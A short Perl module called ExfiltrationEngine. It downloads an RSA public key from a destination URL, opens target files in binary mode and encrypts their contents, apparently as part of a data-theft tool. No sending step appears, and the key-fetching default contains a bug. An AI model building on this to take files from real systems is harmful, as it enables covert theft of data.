#!/usr/bin/perl

package ExfiltrationEngine;

use Crypt::PK::RSA;
use File::stat;
use LWP::UserAgent;
use Moose;

has delay => (
    is  =>  'rw',
    isa =>  'Int'
);

has dest => (
    is  =>  'rw',
    isa =>  'Str'
);

has file => (
    is  =>  'rw'
);

has size => (
    is  =>  'rw',
    isa =>  'Int'
);

has pkey => (
    is      =>  'ro',
    isa     =>  'Str',
    default =>  sub {
        my $self = shift;

        my $userAgent = LWP::UserAgent->new;
        my $request = HTTP::Request->new('GET', $self->dest);

        my $res = $userAgent->request($request);
        $self->{pkey} = $res->decoded_content;
    }
);

sub load {
    my($self, $file) = @_;

    open $self->{file}, '<', $file or die $!;
    binmode $self->file;

    return stat($file)->size;
}

sub close {
    my $self = shift;

    close($self->file);
}

sub encrypt {
    my($self, $data) = @_;
    my $pk = Crypt::PK::RSA->new(\$self->pkey);

    return $pk->encrypt($data, 'v1.5');
}

1;
